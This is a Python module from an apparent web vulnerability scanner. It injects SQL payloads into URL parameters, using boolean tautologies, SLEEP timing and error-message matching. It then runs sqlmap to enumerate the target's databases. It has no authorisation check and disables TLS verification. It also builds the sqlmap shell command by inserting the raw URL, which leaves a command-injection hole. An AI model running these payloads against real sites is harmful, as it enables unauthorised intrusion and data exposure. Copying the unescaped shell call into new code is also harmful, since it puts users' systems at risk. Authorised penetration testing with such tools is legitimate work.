import os
import re
import logging
import requests
import time
import difflib
from typing import Tuple
from core.utils import run_command, save_raw_output, parse_url_params
from core.rate_limiter import get_rate_limiter

logger = logging.getLogger('snooger')

ERROR_PATTERNS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
    r"ORA-\d{4,5}", r"Oracle.*Driver", r"Oracle.*Error",
    r"Microsoft.*ODBC.*SQL", r"Unclosed quotation mark",
    r"SQLSTATE\[", r"PSQLException", r"PostgreSQL.*ERROR",
    r"SQLite.*Exception", r"near \".*\": syntax error",
    r"Incorrect syntax near", r"mssql_", r"ODBC.*Driver",
    r"DB2.*SQL.*error", r"Dynamic SQL Error", r"Warning.*SQLite",
]

def quick_sqli_test(url: str, workspace_dir: str, auth=None) -> dict:
    """Fast SQLi detection using differential analysis + error detection."""
    logger.debug(f"Quick SQLi test: {url}")
    rl = get_rate_limiter()
    base_url, params = parse_url_params(url)
    if not params:
        return {'validated': False, 'reason': 'no parameters'}

    session = auth.session if auth else requests.Session()
    session.headers.setdefault('User-Agent', 'Mozilla/5.0')

    for param in params:
        original = params[param]
        try:
            rl.wait(base_url)
            baseline = session.get(base_url, params=params, timeout=10, verify=False)
            baseline_text = baseline.text
        except Exception as e:
            logger.debug(f"Baseline request failed: {e}")
            continue

        # Boolean-based differential
        true_params = params.copy()
        true_params[param] = original + "' OR '1'='1' -- -"
        false_params = params.copy()
        false_params[param] = original + "' OR '1'='2' -- -"

        try:
            rl.wait(base_url)
            true_resp = session.get(base_url, params=true_params, timeout=10, verify=False)
            rl.wait(base_url)
            false_resp = session.get(base_url, params=false_params, timeout=10, verify=False)

            # Error-based detection
            for pattern in ERROR_PATTERNS:
                for resp in [true_resp, false_resp]:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        return {
                            'validated': True,
                            'type': 'SQL Injection (error-based)',
                            'parameter': param,
                            'payload': true_params[param],
                            'evidence': f"SQL error pattern: {pattern}",
                            'severity': 'critical'
                        }

            # Differential analysis using similarity
            similarity = difflib.SequenceMatcher(
                None, true_resp.text, false_resp.text
            ).ratio()

            if similarity < 0.8:
                baseline_sim = difflib.SequenceMatcher(
                    None, baseline_text, true_resp.text
                ).ratio()
                if baseline_sim > 0.9:  # True condition = baseline, false = different
                    return {
                        'validated': True,
                        'type': 'SQL Injection (boolean-based)',
                        'parameter': param,
                        'payload': true_params[param],
                        'evidence': f"Boolean differential: true/false similarity={similarity:.2f}",
                        'severity': 'high'
                    }

            # Time-based
            sleep_params = params.copy()
            sleep_params[param] = original + "' AND SLEEP(4) -- -"
            rl.wait(base_url)
            start = time.time()
            session.get(base_url, params=sleep_params, timeout=8, verify=False)
            elapsed = time.time() - start
            if elapsed > 3.5:
                return {
                    'validated': True,
                    'type': 'SQL Injection (time-based)',
                    'parameter': param,
                    'payload': sleep_params[param],
                    'evidence': f"Response delayed {elapsed:.1f}s after SLEEP(4)",
                    'severity': 'high'
                }

        except requests.exceptions.Timeout:
            return {
                'validated': True,
                'type': 'SQL Injection (time-based, timeout)',
                'parameter': param,
                'evidence': 'Request timed out after time-based payload',
                'severity': 'high'
            }
        except Exception as e:
            logger.debug(f"SQLi test error for param {param}: {e}")

    return {'validated': False}

def validate_sqlmap(url: str, workspace_dir: str,
                    extra_params: str = "--batch --dbs --level=1 --risk=1",
                    auth=None) -> dict:
    """Run sqlmap for definitive SQLi confirmation."""
    logger.info(f"Running sqlmap validation on {url}")
    out_dir = os.path.join(workspace_dir, 'validation', 'sqlmap')
    os.makedirs(out_dir, exist_ok=True)
    cmd = f"sqlmap -u '{url}' {extra_params} --output-dir={out_dir} --no-logging"
    stdout, stderr, rc = run_command(cmd, timeout=300)
    save_raw_output(workspace_dir, 'validation', f'sqlmap_{abs(hash(url)) % 100000}', stdout + stderr, 'txt')

    is_vulnerable = ("vulnerable" in stdout.lower() or
                     "available databases" in stdout or
                     "sqlmap identified" in stdout.lower())
    if is_vulnerable:
        dbs = _extract_databases(stdout)
        return {
            'validated': True,
            'type': 'SQL Injection',
            'tool': 'sqlmap',
            'evidence': stdout[:800],
            'databases': dbs
        }
    return {'validated': False, 'tool': 'sqlmap'}

def _extract_databases(sqlmap_output: str) -> list:
    dbs = []
    capture = False
    for line in sqlmap_output.splitlines():
        if "available databases" in line.lower():
            capture = True
            continue
        if capture:
            stripped = line.strip()
            if stripped and not stripped.startswith('[') and len(stripped) < 50:
                dbs.append(stripped.lstrip('* '))
            elif stripped.startswith('[') or not stripped:
                capture = False
    return dbs[:10]
